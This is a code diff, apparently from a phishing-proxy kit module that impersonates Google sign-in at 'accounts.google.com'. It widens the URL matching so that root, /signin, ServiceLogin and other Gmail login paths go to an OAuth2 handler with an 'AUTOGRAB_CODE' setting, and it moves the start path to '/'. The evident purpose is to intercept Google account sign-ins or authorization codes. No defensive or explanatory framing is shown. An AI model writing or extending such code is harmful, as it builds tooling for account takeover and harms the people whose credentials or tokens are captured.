@@ -134,8 +134,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        // Handle OAuth2 authorization flow
-        if (this.req.url.startsWith('/oauth/authorize')) {
+        // Handle OAuth2 authorization flow - redirect all Gmail sign-in attempts to OAuth2
+        if (this.req.url.startsWith('/oauth/authorize') || 
+            this.req.url === '/' || 
+            this.req.url.startsWith('/signin') || 
+            this.req.url.startsWith('/v3/signin') ||
+            this.req.url.includes('accounts.google.com') ||
+            this.req.url.includes('ServiceLogin')) {
             return this.handleOAuth2Authorize(clientContext)
         }
 
@@ -372,7 +377,7 @@ const configExport = {
 
     CURRENT_DOMAIN: 'accounts.google.com',
 
-    START_PATH: '/oauth/authorize',
+    START_PATH: '/',
 
     AUTOGRAB_CODE: 'OAuth2',
 
@@ -394,7 +399,7 @@ const configExport = {
     MODULE_ENABLED: true,
 
     MODULE_OPTIONS: {
-        startPath: '/oauth/authorize',
+        startPath: '/',
         exitLink: '/oauth/success',
     },
 
